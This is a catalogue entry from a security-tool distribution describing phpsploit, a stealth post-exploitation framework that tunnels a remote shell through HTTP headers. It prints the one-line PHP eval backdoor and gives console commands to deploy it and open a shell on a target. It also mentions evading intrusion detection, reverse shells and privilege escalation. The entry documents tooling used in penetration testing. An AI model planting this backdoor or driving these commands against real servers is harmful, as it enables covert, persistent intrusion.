---
name: "phpsploit"
categories:
  - blackarch-webapp
version: "1021.aea961d"
homepage: "https://github.com/nil0x42/phpsploit"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "nil0x42/phpsploit"
github-stars: 2507
github-pushed: "2024-05-06"
github-archived: false
github-issues: 27
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# phpsploit

> Stealth post-exploitation C2 that tunnels an interactive shell through HTTP headers via a one-line PHP backdoor.

## What it's for

Maintaining control of a compromised PHP web server after you have managed to plant a single line of PHP: `<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>`. Commands and results travel inside custom HTTP headers of ordinary-looking requests, so nothing incriminating appears in POST bodies or classic webshell patterns, and payloads are obfuscated to evade NIDS signatures. The client side is a full console (autocomplete, session save/load, per-setting polymorphism, http/https/socks4/socks5 proxying) driving 20+ plugins: filesystem browsing and file upload/download that bypass PHP security restrictions, remote file editing in your local editor, SQL console, reverse TCP shells and privilege-escalation helpers. It is a post-exploitation tool — it assumes you can already plant the backdoor; it does not find the injection for you.

## Typical use cases

### Open a session against a backdoored URL

Point the framework at a URL where the backdoor is planted and drop into the remote shell.

```
phpsploit http://target.example.com/uploads/shell.php
```

Outcome: the framework starts with `TARGET` pre-set; run `exploit` to open the remote shell over the HTTP-header tunnel, then `help` in either shell to list available commands.

### Drive the exploit from the console

Use the main shell to configure settings, fetch the backdoor and launch the remote shell.

```
phpsploit
phpsploit > set TARGET http://target.example.com/shell.php
phpsploit > infect
phpsploit > exploit
```

Outcome: `infect` prints the exact one-line PHP backdoor to inject into the target (customizable via settings such as `BACKDOOR`); `exploit` validates the backdoor answers and spawns the interactive remote shell.

### Resume a saved session

Reconnect to a target using a previously saved session file instead of re-typing settings.

```
phpsploit targets/phpsploit.session
```

Outcome: the framework reloads all settings and target state from the session file (sessions are written with the `save` command), so long-running access survives client restarts.

*Provenance: no corpus evidence — derived from upstream documentation (README, man page `phpsploit(1)`, verified 2026-11).*
